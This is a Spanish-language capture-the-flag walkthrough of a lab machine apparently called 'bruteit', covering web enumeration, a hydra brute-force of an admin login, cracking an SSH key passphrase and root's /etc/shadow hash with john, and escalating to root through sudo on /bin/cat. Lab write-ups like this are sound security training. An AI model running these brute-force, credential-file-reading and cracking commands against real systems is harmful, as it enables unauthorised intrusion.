PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

-Hacemos enumeración web y encontramos /admin con un panel de login. Observando el código fuente con CONTROL + U vemos que el usuario es admin.

-Hay 2 formas de vulnerar la máquina:
	1-Aplicando fuerza bruta en el panel de login:
		hydra 10.10.24.126 http-post-form -l admin -P /usr/share/wordlists/rockyou.txt "/admin/index.php:user=^USER^&pass=^PASS^:F=Username or password invalid"
		login: admin   password: xavier
		-Dentro encontramos un link que nos lleva a la id_rsa del usuario john.
	2-Interceptando la petición con BurpSuite y viendo que pasa por detrás:
		-Interceptamos la petición en la ruta /admin/panel y encontramos el mismo link que nos lleva a la id_rsa. 

-La id_rsa viene con PASSPRASE, por lo que tenemos que generar un hash a partir de la id_rsa y romperla con john:
	ssh2john id_rsa > hash.txt
	john -w /usr/share/wordlist/rockyou.txt
	password: rockinroll

-Damos los permisos necesarios y nos autenticamos en ssh con la id_rsa:
	chmod 0400 id_rsa
	ssh -i id_rsa john@10.10.24.126
	Enter Passprase: rockinroll
	john@bruteit:/$


## Escalada de Privilegios

-sudo -l:
	(root) NOPASSWD: /bin/cat

-Al tener permisos de sudo en /bin/cat, podemos ver el contenido de cualquier archivo

-Usamos /bin/cat para ver el contenido del archivo /etc/shadow, que es donde se guardan la contraseñas de los usuarios de sistema:
	sudo /bin/cat /etc/shadow
	root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::

-Tenemos la contraseña cifrada del usuario root, lo copiamos y lo intentamos romper en nuestra máquina con john:
	john --wordlist=/usr/share/wordlists/rockyou.txt rootHash.txt
	password: football

su root
password: football

root@bruteit:/# whoami
root